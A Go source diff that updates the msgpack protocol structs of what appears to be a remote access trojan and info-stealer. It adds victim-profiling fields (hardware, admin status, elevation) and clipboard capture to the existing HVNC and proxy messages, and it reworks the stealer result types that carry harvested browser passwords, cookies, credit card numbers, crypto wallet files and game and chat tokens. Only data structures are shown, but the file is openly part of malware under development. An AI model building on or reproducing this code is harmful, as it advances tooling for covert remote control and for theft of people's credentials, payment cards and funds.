@@ -15,6 +15,12 @@ type Hello struct {
 	BuildTag    string        `msgpack:"buildTag,omitempty"`
 	PublicKey   string        `msgpack:"publicKey,omitempty"`
 	Signature   string        `msgpack:"signature,omitempty"`
+	InMemory    bool          `msgpack:"inMemory,omitempty"`
+	CPU         string        `msgpack:"cpu,omitempty"`
+	GPU         string        `msgpack:"gpu,omitempty"`
+	RAM         string        `msgpack:"ram,omitempty"`
+	IsAdmin     bool          `msgpack:"isAdmin,omitempty"`
+	Elevation   string        `msgpack:"elevation,omitempty"`
 }
 
 type EnrollmentChallenge struct {
@@ -68,6 +74,10 @@ type Frame struct {
 	Type   string      `msgpack:"type"`
 	Header FrameHeader `msgpack:"header"`
 	Data   []byte      `msgpack:"data"`
+}
+
+type FrameAck struct {
+	Type string `msgpack:"type"`
 }
 
 type ScreenshotResult struct {
@@ -228,6 +238,12 @@ type HVNCLookupResult struct {
 	Done bool   `msgpack:"done"`
 }
 
+type ClipboardContent struct {
+	Type   string `msgpack:"type"`
+	Text   string `msgpack:"text"`
+	Source string `msgpack:"source"`
+}
+
 type ProxyData struct {
 	Type         string `msgpack:"type"`
 	ConnectionID string `msgpack:"connectionId"`
@@ -239,69 +255,79 @@ type ProxyClose struct {
 	ConnectionID string `msgpack:"connectionId"`
 }
 
-type CleanupResult struct {
-	Type      string   `msgpack:"type"`
-	CommandID string   `msgpack:"commandId"`
-	OK        bool     `msgpack:"ok"`
-	Cleared   []string `msgpack:"cleared"`
-	Errors    []string `msgpack:"errors"`
+type DisconnectInfo struct {
+	Type   string `msgpack:"type"`
+	Reason string `msgpack:"reason"`           // "normal", "panic", "crash", "network", "timeout"
+	Detail string `msgpack:"detail,omitempty"` // error message
 }
 
-type FunResult struct {
-	Type      string `msgpack:"type"`
-	CommandID string `msgpack:"commandId"`
-	OK        bool   `msgpack:"ok"`
-	Message   string `msgpack:"message"`
-}
+// ── Local-only types (stealer, cleanup, fun) ──
 
 type StealCredential struct {
-	Browser  string `msgpack:"browser"`
-	Profile  string `msgpack:"profile"`
+	Browser  string `msgpack:"browser,omitempty"`
+	Profile  string `msgpack:"profile,omitempty"`
 	URL      string `msgpack:"url"`
 	Username string `msgpack:"username"`
 	Password string `msgpack:"password"`
 }
 
 type StealCookie struct {
-	Browser  string `msgpack:"browser"`
-	Profile  string `msgpack:"profile"`
+	Browser  string `msgpack:"browser,omitempty"`
+	Profile  string `msgpack:"profile,omitempty"`
 	Host     string `msgpack:"host"`
 	Name     string `msgpack:"name"`
 	Value    string `msgpack:"value"`
 	Path     string `msgpack:"path"`
-	IsSecure bool   `msgpack:"isSecure"`
+	IsSecure bool   `msgpack:"isSecure,omitempty"`
 }
 
 type StealCard struct {
-	Browser     string `msgpack:"browser"`
-	Profile     string `msgpack:"profile"`
+	Browser     string `msgpack:"browser,omitempty"`
+	Profile     string `msgpack:"profile,omitempty"`
 	Name        string `msgpack:"name"`
 	Number      string `msgpack:"number"`
-	ExpiryMonth int    `msgpack:"expiryMonth"`
-	ExpiryYear  int    `msgpack:"expiryYear"`
+	ExpiryMonth string `msgpack:"expiryMonth,omitempty"`
+	ExpiryYear  string `msgpack:"expiryYear,omitempty"`
 }
 
 type StealWallet struct {
-	Wallet   string `msgpack:"wallet"`
-	Filename string `msgpack:"filename"`
-	DataB64  string `msgpack:"dataB64"`
+	Wallet   string `msgpack:"wallet,omitempty"`
+	Filename string `msgpack:"filename,omitempty"`
+	DataB64  string `msgpack:"dataB64,omitempty"`
 }
 
 type StealGameToken struct {
 	Game     string `msgpack:"game"`
-	Type     string `msgpack:"type"`
-	Username string `msgpack:"username"`
-	Value    string `msgpack:"value"`
+	Type     string `msgpack:"type,omitempty"`
+	Username string `msgpack:"username,omitempty"`
+	Value    string `msgpack:"value,omitempty"`
 }
 
 type StealResult struct {
-	Type        string           `msgpack:"type"`
-	CommandID   string           `msgpack:"commandId"`
-	Credentials []StealCredential `msgpack:"credentials"`
-	Cookies     []StealCookie     `msgpack:"cookies"`
-	Cards       []StealCard       `msgpack:"cards"`
-	Tokens      []string          `msgpack:"tokens"`
-	Wallets     []StealWallet     `msgpack:"wallets"`
-	GameTokens  []StealGameToken  `msgpack:"gameTokens"`
-	Errors      []string          `msgpack:"errors"`
+	Type        string            `msgpack:"type"`
+	CommandID   string            `msgpack:"commandId"`
+	OK          bool              `msgpack:"ok"`
+	Credentials []StealCredential `msgpack:"credentials,omitempty"`
+	Cookies     []StealCookie     `msgpack:"cookies,omitempty"`
+	Cards       []StealCard       `msgpack:"cards,omitempty"`
+	Tokens      []string          `msgpack:"tokens,omitempty"`
+	Wallets     []StealWallet     `msgpack:"wallets,omitempty"`
+	GameTokens  []StealGameToken  `msgpack:"gameTokens,omitempty"`
+	Errors      []string          `msgpack:"errors,omitempty"`
+	Message     string            `msgpack:"message,omitempty"`
+}
+
+type CleanupResult struct {
+	Type      string   `msgpack:"type"`
+	CommandID string   `msgpack:"commandId"`
+	OK        bool     `msgpack:"ok"`
+	Cleared   []string `msgpack:"cleared,omitempty"`
+	Errors    []string `msgpack:"errors,omitempty"`
+}
+
+type FunResult struct {
+	Type      string `msgpack:"type"`
+	CommandID string `msgpack:"commandId"`
+	OK        bool   `msgpack:"ok"`
+	Message   string `msgpack:"message,omitempty"`
 }
